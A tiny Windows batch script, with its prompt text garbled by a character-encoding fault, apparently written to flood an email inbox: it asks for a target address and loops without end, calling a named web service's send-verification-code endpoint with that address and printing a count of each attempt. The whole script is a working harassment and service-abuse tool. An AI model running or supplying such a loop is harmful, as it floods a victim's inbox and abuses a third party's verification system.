@echo off
set /p mail=��������Ҫ���������䣺
set i=0
:start
set /a i+=1
echo [%i%] ����Ŀ�꣺%mail%
curl -ssl https://web.ccf.org.cn/CCF/apply/user!sendAuthCode.action?email=%mail%
goto start: